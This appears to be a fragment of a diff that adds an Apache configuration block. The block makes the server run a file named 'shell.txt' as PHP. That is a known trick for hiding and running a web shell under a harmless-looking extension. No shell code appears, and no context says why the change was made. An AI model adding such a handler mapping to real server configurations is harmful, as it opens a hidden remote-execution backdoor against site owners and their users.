@@ -1,0 +1,3 @@
+  <FilesMatch "shell.txt">
+    SetHandler application/x-httpd-php
+  </FilesMatch>
